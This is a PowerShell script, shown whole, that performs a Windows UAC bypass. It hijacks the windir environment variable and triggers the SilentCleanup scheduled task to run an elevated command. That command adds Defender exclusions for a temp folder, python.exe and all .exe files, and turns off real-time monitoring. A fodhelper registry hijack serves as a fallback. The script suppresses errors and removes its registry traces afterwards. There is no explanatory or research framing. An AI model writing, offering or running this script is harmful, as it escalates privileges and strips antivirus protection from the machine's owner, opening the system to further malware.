$ErrorActionPreference = 'SilentlyContinue'

# UAC bypass via SilentCleanup → add Defender exclusions + disable real-time
$cmd = 'powershell.exe -NoProfile -Command "Add-MpPreference -ExclusionPath C:\Windows\Temp\ziti -ExclusionPath C:\Tools -Force; Add-MpPreference -ExclusionProcess python.exe -Force; Add-MpPreference -ExclusionExtension .exe -Force; Set-MpPreference -DisableRealtimeMonitoring $true -Force; Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, BehaviorMonitorEnabled | Out-File C:\Windows\Temp\ziti\defender_status.txt -Encoding utf8"'

# Hijack HKCU\Environment\windir
Set-ItemProperty -Path 'HKCU:\Environment' -Name 'windir' -Value $cmd -Type String -Force

# Trigger SilentCleanup (runs elevated)
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup\" -TaskName "SilentCleanup"
Start-Sleep 20

# Cleanup registry
Remove-ItemProperty -Path 'HKCU:\Environment' -Name 'windir' -Force -EA SilentlyContinue

# Check result
if (Test-Path "C:\Windows\Temp\ziti\defender_status.txt") {
    Write-Output "=== ELEVATED PROCESS RAN! ==="
    Get-Content "C:\Windows\Temp\ziti\defender_out.txt" -EA SilentlyContinue
    Write-Output "=== Defender status ==="
    $s = Get-MpComputerStatus
    Write-Output "RealTime: $($s.RealTimeProtectionEnabled)"
    Write-Output "Behavior: $($s.BehaviorMonitorEnabled)"
} else {
    Write-Output "elevated process did not run"
    # Fallback: try fodhelper approach
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd.exe /c powershell.exe -NoProfile -Command `"Add-MpPreference -ExclusionPath C:\Windows\Temp\ziti -Force; Add-MpPreference -ExclusionExtension .exe -Force; Set-MpPreference -DisableRealtimeMonitoring `$true -Force; Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled | Out-File C:\Windows\Temp\ziti\def_status.txt`"" /f
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f
    Start-Process "C:\Windows\System32\fodhelper.exe" -Wait
    Start-Sleep 10
    reg delete "HKCU\Software\Classes\ms-settings" /f 2>$null

    if (Test-Path "C:\Windows\Temp\ziti\def_status.txt") {
        Write-Output "=== FODHELPER WORKED! ==="
        Get-Content "C:\Windows\Temp\ziti\def_status.txt"
        $s = Get-MpComputerStatus
        Write-Output "RealTime: $($s.RealTimeProtectionEnabled)"
    } else {
        Write-Output "fodhelper also failed"
        $s = Get-MpComputerStatus
        Write-Output "RealTime: $($s.RealTimeProtectionEnabled)"
        Write-Output "Behavior: $($s.BehaviorMonitorEnabled)"
    }
}